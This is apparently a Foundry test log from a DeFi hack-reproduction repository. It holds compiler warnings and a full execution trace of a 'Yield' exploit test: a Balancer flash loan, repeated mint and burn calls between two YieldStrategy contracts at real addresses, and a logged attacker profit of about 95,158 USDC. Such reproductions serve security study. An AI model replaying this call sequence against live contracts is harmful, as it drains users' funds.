Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.23s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2024-04/Yield_exp.sol:36:5:
   |
36 |     IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 303.22ms (818.04µs CPU time)

Ran 1 test for src/test/2024-04/Yield_exp.sol:Yield
[PASS] testExploit() (gas: 310980)
Logs:
   Attacker USDC Balance After exploit: 95158.562521

Traces:
  [393991] Yield::testExploit()
    ├─ [377764] Balancer::flashLoan(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], [400000000000 [4e11]], 0x)
    │   ├─ [9796] USDC::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    │   │   ├─ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
    │   │   │   └─ ← [Return] 1889140809178 [1.889e12]
    │   │   └─ ← [Return] 1889140809178 [1.889e12]
    │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::getFlashLoanFeePercentage() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [35397] USDC::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000 [4e11])
    │   │   ├─ [34651] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 400000000000 [4e11]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 400000000000 [4e11])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [308496] Yield::receiveFlashLoan([0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], [400000000000 [4e11]], [0], 0x)
    │   │   ├─ [11497] USDC::transfer(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], 308000000000 [3.08e11])
    │   │   │   ├─ [10751] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], 308000000000 [3.08e11]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], value: 308000000000 [3.08e11])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   ├─ [49368] YieldStrategy_1::mintDivested(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ [1296] USDC::balanceOf(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa]) [staticcall]
    │   │   │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 403233316067 [4.032e11]
    │   │   │   │   └─ ← [Return] 403233316067 [4.032e11]
    │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 307649973574 [3.076e11])
    │   │   │   └─ ← [Return] 307649973574 [3.076e11]
    │   │   ├─ [643] YieldStrategy_1::balanceOf(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 307649973574 [3.076e11]
    │   │   ├─ [17631] YieldStrategy_1::transfer(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], 153824986787 [1.538e11])
    │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
    │   │   │   ├─ emit Transfer(from: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], value: 153824986787 [1.538e11])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [50939] YieldStrategy_2::mint(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47])
    │   │   │   ├─ [643] YieldStrategy_1::balanceOf(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47]) [staticcall]
    │   │   │   │   └─ ← [Return] 248942894230 [2.489e11]
    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], value: 153782702251 [1.537e11])
    │   │   │   └─ ← [Return] 153782702251 [1.537e11]
    │   │   ├─ [643] YieldStrategy_1::balanceOf(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 153824986787 [1.538e11]
    │   │   ├─ [10831] YieldStrategy_1::transfer(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], 153824986787 [1.538e11])
    │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
    │   │   │   ├─ emit Transfer(from: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], value: 153824986787 [1.538e11])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [41503] YieldStrategy_2::burn(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
    │   │   │   ├─ emit Transfer(from: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], to: 0x0000000000000000000000000000000000000000, value: 153782702251 [1.537e11])
    │   │   │   ├─ [643] YieldStrategy_1::balanceOf(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47]) [staticcall]
    │   │   │   │   └─ ← [Return] 402767881017 [4.027e11]
    │   │   │   ├─ [30731] YieldStrategy_1::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 248875406415 [2.488e11])
    │   │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
    │   │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
    │   │   │   │   ├─ emit Transfer(from: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], to: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 248875406415 [2.488e11])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] 248875406415 [2.488e11]
    │   │   ├─ [32139] YieldStrategy_2::mint(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47])
    │   │   │   ├─ [643] YieldStrategy_1::balanceOf(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47]) [staticcall]
    │   │   │   │   └─ ← [Return] 153892474602 [1.538e11]
    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], value: 216742664421353 [2.167e14])
    │   │   │   └─ ← [Return] 216742664421353 [2.167e14]
    │   │   ├─ [21603] YieldStrategy_2::burn(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
    │   │   │   ├─ emit Transfer(from: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], to: 0x0000000000000000000000000000000000000000, value: 216742664421353 [2.167e14])
    │   │   │   ├─ [643] YieldStrategy_1::balanceOf(YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47]) [staticcall]
    │   │   │   │   └─ ← [Return] 153892474602 [1.538e11]
    │   │   │   ├─ [10831] YieldStrategy_1::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 153824986786 [1.538e11])
    │   │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], : 0, : 0)
    │   │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
    │   │   │   │   ├─ emit Transfer(from: YieldStrategy_2: [0x3b4FFD93CE5fCf97e61AA8275Ec241C76cC01a47], to: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 153824986786 [1.538e11])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] 153824986786 [1.538e11]
    │   │   ├─ [643] YieldStrategy_1::balanceOf(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   │   └─ ← [Return] 402700393201 [4.027e11]
    │   │   ├─ [34731] YieldStrategy_1::transfer(YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], 402700393201 [4.027e11])
    │   │   │   ├─ emit UserRewardsUpdated(: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 0)
    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], : 0, : 0)
    │   │   │   ├─ emit Transfer(from: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], value: 402700393201 [4.027e11])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [14101] YieldStrategy_1::burnDivested(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   │   ├─ emit UserRewardsUpdated(: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], : 0, : 0)
    │   │   │   ├─ emit Transfer(from: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], to: 0x0000000000000000000000000000000000000000, value: 402700393201 [4.027e11])
    │   │   │   ├─ [4697] USDC::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 403158562521 [4.031e11])
    │   │   │   │   ├─ [3951] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 403158562521 [4.031e11]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: YieldStrategy_1: [0x7012aF43F8a3c1141Ee4e955CC568Ad2af59C3fa], to: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 403158562521 [4.031e11])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] 403158562521 [4.031e11]
    │   │   ├─ [4697] USDC::transfer(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 400000000000 [4e11])
    │   │   │   ├─ [3951] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 400000000000 [4e11]) [delegatecall]
    │   │   │   │   ├─ emit Transfer(from: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 400000000000 [4e11])
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Stop] 
    │   ├─ [1296] USDC::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
    │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [delegatecall]
    │   │   │   └─ ← [Return] 1889140809178 [1.889e12]
    │   │   └─ ← [Return] 1889140809178 [1.889e12]
    │   ├─ emit FlashLoan(param0: Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: USDC: [0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8], param2: 400000000000 [4e11], param3: 0)
    │   └─ ← [Stop] 
    ├─ [1296] USDC::balanceOf(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(Yield: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 95158562521 [9.515e10]
    │   └─ ← [Return] 95158562521 [9.515e10]
    ├─ [3121] USDC::decimals() [staticcall]
    │   ├─ [2381] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::decimals() [delegatecall]
    │   │   └─ ← [Return] 6
    │   └─ ← [Return] 6
    ├─ emit log_named_decimal_uint(key: " Attacker USDC Balance After exploit", val: 95158562521 [9.515e10], decimals: 6)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.05s (5.88s CPU time)

Ran 2 test suites in 7.31s (7.36s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
